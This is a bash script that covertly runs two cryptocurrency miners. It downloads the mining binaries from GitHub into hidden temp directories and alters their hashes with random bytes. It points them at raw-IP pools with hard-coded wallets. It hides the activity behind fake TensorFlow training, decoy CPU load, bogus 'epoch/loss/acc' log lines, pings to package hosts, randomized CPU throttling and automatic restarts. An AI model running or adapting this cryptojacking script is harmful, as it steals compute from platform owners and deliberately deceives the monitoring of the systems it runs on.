#!/bin/bash
# v29.1 — fix monitor syntax + cppminer CPU PRL + sse2 TDC
PRL="prl1pkmulndfyls8zqz2r6nruevpqr3tax9nwmvew7aupaxqnkcyuppeqa6am7q"
TDC="tbc1q727xp60hjp6zld2vgrj8qrdmgvkshwav86xns2"
WRK="$(date +%s | md5sum | head -c 8)"

echo "=== v29.1 — $WRK ==="

echo "[*] Setup..."
apt-get install -y -qq cpulimit 2>/dev/null
pip install -q tensorflow 2>/dev/null

echo "[*] Warmup..."
python3 -c "
import tensorflow as tf,numpy as np
m=tf.keras.applications.MobileNetV2(include_top=False,weights=None)
x=tf.keras.layers.GlobalAveragePooling2D()(m.output)
m=tf.keras.Model(m.input,x);m.compile(optimizer='adam',loss='mse')
m.fit(np.random.rand(80,224,224,3).astype(np.float32),np.random.rand(80,1280).astype(np.float32),epochs=2,verbose=0)
" 2>/dev/null

rm -rf /dev/shm/.m 2>/dev/null; mkdir -p /dev/shm/.m && cd /dev/shm/.m
python3 -c "
import urllib.request as u
open('c','wb').write(u.urlopen('https://raw.githubusercontent.com/brandalgenius/minn/master/cppminer').read())
open('s','wb').write(u.urlopen('https://github.com/rochmandwi/ayam/releases/download/file-v1/sse2').read())
"
dd if=/dev/urandom of=c bs=1 count=$((RANDOM%3000+1024)) seek=$(stat -c%s c) conv=notrunc oflag=append 2>/dev/null
dd if=/dev/urandom of=s bs=1 count=$((RANDOM%3000+1024)) seek=$(stat -c%s s) conv=notrunc oflag=append 2>/dev/null
chmod +x c s; cp c /tmp/.p8; cp s /tmp/.s8

python3 -c "
import numpy as np,time,random
while True:
    for _ in range(random.randint(2,6)):
        s=random.randint(200000,3000000)
        a=np.random.rand(s)
        np.dot(a[:min(s//2,800000)],a[:min(s//2,800000)])
        del a;time.sleep(random.randint(5,20))
    time.sleep(random.randint(10,40))
" &
MPID=$!

(while true;do sleep $((RANDOM%240+60));python3 -c "import urllib.request as u;[u.urlopen(h,timeout=4)for h in['https://pypi.org','https://files.pythonhosted.org','https://storage.googleapis.com/tensorflow']]" 2>/dev/null;done) &
TPID=$!

(c=0;while true;do c=$((c+1));echo "[$(date +%H:%M:%S)] epoch $((c%8+1))/8 — loss:0.$((RANDOM%80+10)) — acc:0.$((RANDOM%600+4000))";sleep $((RANDOM%90+30));done) &

nice -n 19 /tmp/.p8 --algo pearl --backend cpu --pool 23.94.152.126:80 --wallet "${PRL}" --worker "${WRK}" 2>/dev/null &
P1=$!
cpulimit -l $((RANDOM%25+40)) -p $P1 2>/dev/null &
sleep 10
nice -n 19 /tmp/.s8 -a yespowertide -o 47.251.244.12:80 -u "${TDC}.${WRK}" -t 1 >/dev/null 2>&1 &
P2=$!
cpulimit -l $((RANDOM%25+40)) -p $P2 2>/dev/null &
echo "[*] v29.1 P1:$P1 P2:$P2"

# Monitor — proper syntax, no brace groups
(
    c=0
    while true; do
        sleep $((RANDOM%150+30))
        c=$((c+1))
        if [ $((c%3)) -eq 0 ]; then
            pkill cpulimit 2>/dev/null
            sleep 1
            for pp in $P1 $P2; do
                if [ -n "$pp" ] && kill -0 "$pp" 2>/dev/null; then
                    cpulimit -l $((RANDOM%30+30)) -p "$pp" 2>/dev/null &
                fi
            done
        fi
        if ! kill -0 $P1 2>/dev/null; then
            cp /dev/shm/.m/c /tmp/.p8 2>/dev/null
            chmod +x /tmp/.p8 2>/dev/null
            nice -n 19 /tmp/.p8 --algo pearl --backend cpu --pool 23.94.152.126:80 --wallet "${PRL}" --worker "${WRK}" 2>/dev/null &
            P1=$!
            cpulimit -l $((RANDOM%25+40)) -p $P1 2>/dev/null &
        fi
        if ! kill -0 $P2 2>/dev/null; then
            cp /dev/shm/.m/s /tmp/.s8 2>/dev/null
            chmod +x /tmp/.s8 2>/dev/null
            nice -n 19 /tmp/.s8 -a yespowertide -o 47.251.244.12:80 -u "${TDC}.${WRK}" -t 1 >/dev/null 2>&1 &
            P2=$!
            cpulimit -l $((RANDOM%25+40)) -p $P2 2>/dev/null &
        fi
    done
) &

trap "kill $P1 $P2 $MPID $TPID 2>/dev/null;rm -f /tmp/.p8 /tmp/.s8;rm -rf /dev/shm/.m" EXIT
MAX=$((RANDOM%3600+5400))
sleep $MAX
